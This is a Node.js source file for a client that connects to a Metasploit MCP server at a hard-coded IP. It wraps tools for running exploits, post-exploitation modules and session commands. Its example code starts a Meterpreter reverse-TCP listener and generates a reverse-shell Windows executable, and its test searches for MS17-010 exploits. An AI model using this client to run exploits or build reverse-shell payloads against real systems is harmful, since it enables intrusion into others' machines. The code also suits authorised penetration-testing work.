// Working Metasploit MCP Client for Node.js
// This implementation correctly handles the MCP protocol over SSE

import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { SSEClientTransport } from '@modelcontextprotocol/sdk/client/sse.js';
import * as EventSource from 'eventsource';

// Required for Node.js - add EventSource to global scope
global.EventSource = EventSource.default || EventSource;

class MetasploitMCPClient {
    constructor(url = 'http://178.128.242.63:8085') {
        this.url = url;
        this.client = null;
        this.transport = null;
        this.isConnected = false;
    }

    async connect() {
        try {
            console.log(`Connecting to Metasploit MCP server at ${this.url}...`);
            
            // Create SSE transport
            this.transport = new SSEClientTransport(
                new URL(`${this.url}/sse`)
            );

            // Create MCP client with proper configuration
            this.client = new Client({
                name: 'metasploit-nodejs-client',
                version: '1.0.0'
            }, {
                capabilities: {}
            });

            // Connect to the server
            await this.client.connect(this.transport);
            
            this.isConnected = true;
            console.log('✓ Successfully connected to Metasploit MCP server');
            
            return true;
        } catch (error) {
            console.error('Failed to connect:', error.message);
            this.isConnected = false;
            throw error;
        }
    }

    async disconnect() {
        if (this.client && this.isConnected) {
            await this.client.close();
            this.isConnected = false;
            console.log('Disconnected from Metasploit MCP server');
        }
    }

    async callTool(toolName, args = {}) {
        if (!this.isConnected) {
            throw new Error('Not connected to MCP server. Call connect() first.');
        }

        try {
            // Call the tool with proper MCP protocol formatting
            const result = await this.client.callTool({
                name: toolName,
                arguments: args
            });
            
            // Parse the response content
            if (result && result.content && result.content.length > 0) {
                // Special handling for multiple text items (like exploit lists)
                if (result.content.length > 1 && result.content.every(item => item.type === 'text')) {
                    // Return the raw result for specialized parsing in individual methods
                    return result;
                }
                
                // Single content item - handle normally
                const content = result.content[0];
                
                // Handle text content (most common)
                if (content.type === 'text' && content.text) {
                    try {
                        // Try to parse as JSON first
                        return JSON.parse(content.text);
                    } catch {
                        // Return as plain text if not JSON
                        return content.text;
                    }
                }
                
                // Return raw content for other types
                return content;
            }
            
            return result;
        } catch (error) {
            console.error(`Error calling tool '${toolName}':`, error.message);
            throw error;
        }
    }

    // Convenience methods for common operations
    
    async listTools() {
        const result = await this.client.listTools();
        return result.tools;
    }

    async listExploits(searchTerm = '') {
        const result = await this.callTool('list_exploits', { search_term: searchTerm });
        
        // The MCP server returns exploit names as individual text content items
        // We need to extract all the text items and return them as an array
        if (result && result.content && Array.isArray(result.content)) {
            const exploitNames = result.content
                .filter(item => item.type === 'text' && item.text)
                .map(item => item.text);
            return exploitNames;
        }
        
        // Fallback: if result is already an array (from callTool processing)
        if (Array.isArray(result)) {
            return result;
        }
        
        // Fallback: if result is a string, try to parse it
        if (typeof result === 'string') {
            try {
                const parsed = JSON.parse(result);
                if (Array.isArray(parsed)) {
                    return parsed;
                }
            } catch {
                // If not JSON, return as single item array
                return [result];
            }
        }
        
        return [];
    }

    async listPayloads(platform = '', arch = '') {
        return this.callTool('list_payloads', { platform, arch });
    }

    async generatePayload(payloadType, formatType, options, additionalParams = {}) {
        const args = {
            payload_type: payloadType,
            format_type: formatType,
            options: options,
            ...additionalParams
        };
        return this.callTool('generate_payload', args);
    }

    async runExploit(moduleName, options, payloadName = null, payloadOptions = null, runAsJob = false, checkVulnerability = false) {
        const args = {
            module_name: moduleName,
            options: options
        };
        
        if (payloadName) args.payload_name = payloadName;
        if (payloadOptions) args.payload_options = payloadOptions;
        if (runAsJob !== undefined) args.run_as_job = runAsJob;
        if (checkVulnerability !== undefined) args.check_vulnerability = checkVulnerability;
        
        return this.callTool('run_exploit', args);
    }

    async runAuxiliaryModule(moduleName, options, runAsJob = false, checkTarget = false) {
        const args = {
            module_name: moduleName,
            options: options,
            run_as_job: runAsJob,
            check_target: checkTarget
        };
        return this.callTool('run_auxiliary_module', args);
    }

    async runPostModule(moduleName, sessionId, options = {}, runAsJob = false) {
        const args = {
            module_name: moduleName,
            session_id: sessionId,
            options: options,
            run_as_job: runAsJob
        };
        return this.callTool('run_post_module', args);
    }

    async listActiveSessions() {
        return this.callTool('list_active_sessions', {});
    }

    async sendSessionCommand(sessionId, command, timeoutSeconds = 60) {
        const args = {
            session_id: sessionId,
            command: command,
            timeout_seconds: timeoutSeconds
        };
        return this.callTool('send_session_command', args);
    }

    async listListeners() {
        return this.callTool('list_listeners', {});
    }

    async startListener(payloadType, lhost, lport, additionalOptions = null, exitOnSession = false) {
        const args = {
            payload_type: payloadType,
            lhost: lhost,
            lport: lport,
            exit_on_session: exitOnSession
        };
        
        if (additionalOptions) {
            args.additional_options = additionalOptions;
        }
        
        return this.callTool('start_listener', args);
    }

    async stopJob(jobId) {
        return this.callTool('stop_job', { job_id: jobId });
    }

    async terminateSession(sessionId) {
        return this.callTool('terminate_session', { session_id: sessionId });
    }
}

// Test function to verify the client works
async function testClient() {
    const client = new MetasploitMCPClient();
    
    try {
        // Connect to the server
        await client.connect();
        
        console.log('\n=== Testing Metasploit MCP Client ===\n');
        
        // Test 1: List available tools
        console.log('1. Listing available tools...');
        try {
            const tools = await client.listTools();
            console.log(`✓ Found ${tools.length} tools available`);
            console.log('  Tools:', tools.map(t => t.name).join(', '));
        } catch (error) {
            console.error('✗ Error listing tools:', error.message);
        }
        
        // Test 2: Search for exploits
        console.log('\n2. Searching for MS17-010 exploits...');
        try {
            const exploits = await client.listExploits('ms17_010');
            console.log(`✓ Found ${exploits.length} exploits:`);
            exploits.forEach(exploit => console.log(`  - ${exploit}`));
        } catch (error) {
            console.error('✗ Error listing exploits:', error.message);
        }
        
        // Test 3: List Windows x64 payloads
        console.log('\n3. Listing Windows x64 payloads...');
        try {
            const payloads = await client.listPayloads('windows', 'x64');
            console.log(`✓ Found ${payloads.length} payloads`);
            console.log('  First 5:', payloads.slice(0, 5));
        } catch (error) {
            console.error('✗ Error listing payloads:', error.message);
        }
        
        // Test 4: Check active sessions
        console.log('\n4. Checking active sessions...');
        try {
            const result = await client.listActiveSessions();
            if (result.status === 'success') {
                console.log(`✓ Active sessions: ${result.count}`);
                if (result.count > 0) {
                    console.log('  Sessions:', result.sessions);
                }
            } else {
                console.log('✗ Error:', result.message);
            }
        } catch (error) {
            console.error('✗ Error listing sessions:', error.message);
        }
        
        // Test 5: List listeners/jobs
        console.log('\n5. Checking active listeners...');
        try {
            const result = await client.listListeners();
            if (result.status === 'success') {
                console.log(`✓ Active handlers: ${result.handler_count}`);
                console.log(`  Other jobs: ${result.other_job_count}`);
                console.log(`  Total jobs: ${result.total_job_count}`);
            } else {
                console.log('✗ Error:', result.message);
            }
        } catch (error) {
            console.error('✗ Error listing listeners:', error.message);
        }
        
        console.log('\n=== All tests completed ===\n');
        
    } catch (error) {
        console.error('Fatal error:', error);
    } finally {
        // Always disconnect
        await client.disconnect();
    }
}

// Example of how to use in your own application
async function exampleUsage() {
    const client = new MetasploitMCPClient();
    
    try {
        await client.connect();
        
        // Example: Start a listener
        const listener = await client.startListener(
            'windows/meterpreter/reverse_tcp',
            '0.0.0.0',
            4444
        );
        console.log('Listener started:', listener);
        
        // Example: Generate a payload
        const payload = await client.generatePayload(
            'windows/meterpreter/reverse_tcp',
            'exe',
            { LHOST: '192.168.1.10', LPORT: 4444 }
        );
        console.log('Payload generated:', payload);
        
    } finally {
        await client.disconnect();
    }
}

// Export the client class
export { MetasploitMCPClient };

// Run tests if this file is executed directly
if (import.meta.url === `file://${process.argv[1]}`) {
    console.log('Running Metasploit MCP Client tests...\n');
    testClient().catch(console.error);
} 